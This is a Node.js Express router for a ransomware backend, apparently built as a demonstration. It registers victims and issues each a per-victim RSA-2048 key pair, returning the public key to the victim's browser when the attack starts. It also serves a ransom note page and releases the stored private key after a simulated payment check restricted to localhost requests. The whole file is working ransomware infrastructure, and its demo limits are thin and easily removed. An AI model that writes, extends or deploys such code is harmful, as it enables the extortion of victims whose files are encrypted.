const express = require('express');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const { generateRSAKeyPair } = require('../crypto/keygen');
const db = require('../db/database');

const router = express.Router();

const VICTIM_ID_PATTERN = /^V-[A-F0-9]{8}$/;

function escapeHtml(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60_000;
const RATE_LIMIT_MAX = 30;

function rateLimit(req, res, next) {
    const ip = req.ip || req.socket?.remoteAddress || 'unknown';
    const now = Date.now();
    const entry = rateLimitMap.get(ip);

    if (!entry || now - entry.windowStart > RATE_LIMIT_WINDOW) {
        rateLimitMap.set(ip, { windowStart: now, count: 1 });
        return next();
    }

    entry.count++;
    if (entry.count > RATE_LIMIT_MAX) {
        return res.status(429).json({ error: 'Too many requests' });
    }
    next();
}

router.use(rateLimit);

function isLocalDemoRequest(req) {
    const host = req.hostname;
    const remoteAddress = req.ip || req.socket?.remoteAddress || '';
    const localHosts = new Set(['localhost', '127.0.0.1', '::1']);

    return (
        localHosts.has(host) ||
        remoteAddress === '::1' ||
        remoteAddress === '127.0.0.1' ||
        remoteAddress === '::ffff:127.0.0.1'
    );
}

function validateVictimId(req, res, next) {
    const { victimId } = req.params;
    if (!VICTIM_ID_PATTERN.test(victimId)) {
        return res.status(400).json({ error: 'Invalid victim ID format' });
    }
    next();
}

/**
 * POST /api/register
 * Called when the victim's browser initiates the attack.
 * Generates RSA-2048 keys, saves private key, returns public key.
 */
router.post('/register', (req, res) => {
    try {
        const victimId = 'V-' + crypto.randomUUID().substring(0, 8).toUpperCase();

        // Generate Keys
        const { publicKey, privateKey } = generateRSAKeyPair();

        // Save to DB
        db.saveVictim({
            id: victimId,
            publicKey: publicKey,
            privateKey: privateKey, // NEVER share this with the client
            paid: false,
            timestamp: new Date().toISOString()
        });

        res.status(201).json({
            victimId: victimId,
            publicKey: publicKey
        });
    } catch (error) {
        res.status(500).json({ error: "Failed to register victim" });
    }
});

/**
 * GET /api/ransom/:victimId
 * Serves the extortion/ransom note page dynamically.
 */
router.get('/ransom/:victimId', validateVictimId, (req, res) => {
    const victim = db.getVictim(req.params.victimId);

    if (!victim) {
        return res.status(404).send("Victim not found.");
    }

    const templatePath = path.join(__dirname, '../views/ransom.html');
    if (!fs.existsSync(templatePath)) {
        return res.status(500).send("Ransom template missing.");
    }

    let html = fs.readFileSync(templatePath, 'utf8');
    html = html.replace(/{{VICTIM_ID}}/g, escapeHtml(victim.id));

    res.send(html);
});

/**
 * POST /api/decrypt-key/:victimId
 * Simulates payment verification.
 */
router.post('/decrypt-key/:victimId', validateVictimId, (req, res) => {
    if (!isLocalDemoRequest(req)) {
        return res.status(403).json({
            error: "Private key release is restricted to local demo requests"
        });
    }

    const victim = db.getVictim(req.params.victimId);

    if (!victim) {
        return res.status(404).json({ error: "Victim not found" });
    }

    // For simulation: we just flip the paid flag
    // In reality, this would check the blockchain for a transaction
    db.updateVictim(victim.id, { paid: true });

    res.json({
        status: "success",
        message: "Payment verified.",
        privateKey: victim.privateKey
    });
});

module.exports = router;
